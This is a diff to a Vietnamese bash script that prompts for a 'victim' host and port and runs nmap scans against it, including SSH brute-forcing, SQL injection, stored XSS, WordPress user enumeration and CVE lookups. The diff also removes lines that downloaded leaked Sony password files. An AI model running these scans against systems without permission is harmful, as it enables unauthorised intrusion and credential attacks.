@@ -55,7 +55,7 @@ echo -e "\e[1;34m         chúc mấy thằng nhóc trích lỏ dùng tun vui v�
 echo -e "\e[1;34m══════════════════════════════════════════════════════════════════"
 echo -e "\033[4;91mđiền nạn nhân vào đây , bỏ http:// nhé ( ví dụ : testphp.vulnweb.com) :\033[0m "
 read TARGET
-echo -e "\033[4;91mĐiền Port vào đây , mấy thằng nhóc : \033[0m "
+echo -e "\033[4;91mĐiền Port vào đây : \033[0m "
 read PORT
 echo "À mà khoan , trước khi khai thác , Phạm Chiến có đẹp Trai không ? :"
 read USER
@@ -91,7 +91,7 @@ echo -e "\e[1;34m╚════════════════════
 sleep 25
 echo ""
 echo -e "\033[4;91mexploiting $TARGET\033[0m"
-sleep 10
+sleep 5
 figlet Scan Domain and DNS
 nmap -sV $TARGET
 figlet Scan Vuln
@@ -101,6 +101,8 @@ nmap --script ssh-brute -p $PORT $TARGET
 nmap -sV --script freevulnsearch --script-args apipath=$TARGET
 echo "hacker pham chien"
 echo -e "\033[4;91m OSVDB-3092 - Lỗ hổng bảo mật cho phép kẻ tấn công ghi vào bất kỳ vị trí nào trong tệphệ thống.\033[0m "
+figlet Scan XML output
+nmap -T4 -A -p 1-1000 -oX - $TARGET
 figlet Scan Port
 nmap $TARGET
 echo ""
@@ -121,16 +123,10 @@ echo ""
 echo " Pham Chien Said :"
 echo -e "\033[4;91mSQL injection – còn được gọi là SQLi – sử dụng những lỗ hổng trong các kênh đầu vào (input) của website để nhắm mục tiêu vào cơ sở dữ liệu nằm trong phần phụ trợ của ứng dụng web, nơi lưu giữ những thông tin nhạy cảm và có giá trị nhất\033[0m "
 echo -e "\033[4;91mexploiting $TARGET\033[0m"
-sleep 10
+sleep 3
 nmap -p $PORT --script http-sql-injection $TARGET
-sleep 10
-curl https://wikileaks.org/sony/docs/bonus/1/Password/50%20new%20user%20password.txt
+sleep 3
 echo ""
-sleep 10
-curl https://wikileaks.org/sony/docs/bonus/1/Password/Accounts%20Passwords.txt
-sleep 9
-curl https://wikileaks.org/sony/docs/bonus/1/Password/Master%20Application%20List.txt
-sleep 5 
 figlet Scan vulners FTFD
 echo -e "\033[4;91mexploiting $TARGET\033[0m"
 sleep 10
@@ -138,7 +134,7 @@ nmap -p 21 -A $TARGET
 sleep 4
 figlet Scan SSH
 echo -e "\033[4;91mexploiting $TARGET\033[0m"
-sleep 10
+sleep 3
 ssh $TARGET:$PORT
 sleep 5
 echo "╔════════════════════════════════════════════════════════════════╗"
@@ -147,7 +143,7 @@ echo "╚═══════════════════════�
 echo "Chien said : "
 echo -e "\033[4;91mLỗ hổng WordPress được phân loại là giả mạo cross-site (CSRF) và được theo dõi dưới mã CVE-2022-0215 với mức nguy hiểm 8.8 theo thang CVSS. Nó ảnh hưởng tới ba plugin được duy trì bởi Xootix: Login/Signup Popup (Inline Form + Woocommerce)\033[0m "
 echo -e "\033[4;91mexploiting $TARGET\033[0m"
-sleep 10
+sleep 3
 nmap -p $PORT --script http-wordpress-users $TARGET
 echo "╔════════════════════════════════════════════════════════════════╗"
 echo "║                   XSS Scanning Finished                        ║"
@@ -155,11 +151,11 @@ echo "╚═══════════════════════�
 echo "Chiến said :"
 echo -e " \033[4;91mXSS là tên viết tắt của Cross-site scripting. Đây là một hình thức tấn công bằng mã độc phổ biến. Các hacker sẽ lợi dụng lỗ hổng trong bảo mật web để chèn các mã script, sau đó gửi cho người dùng để truy cập và mạo danh người dùng \033[0m "
 echo -e "\033[4;91mexploiting $TARGET\033[0m"
-sleep 10
+sleep 3
 nmap -p $PORT --script http-stored-xss.nse $TARGET
 figlet Scan CVE
 echo -e "\033[4;91mexploiting $TARGET\033[0m"
-sleep 10
+sleep 3
 nmap -sV --script vulners --script-args  minvcss=5.0 $TARGET
 echo " Chien said:"
 echo -e "\033[4;91mBản chất đây là thuật ngữ được viết tắt từ cụm tiếng Anh Common Vulnerabilities and Exposures. Bạn có thể hiểu đây là danh sách các lỗi bảo mật máy tính công khai. Một khi nhắc đến CVE có nghĩa là đang nói về một lỗ hổng bảo mật đã được gắn một số CVE ID.\033[0m "
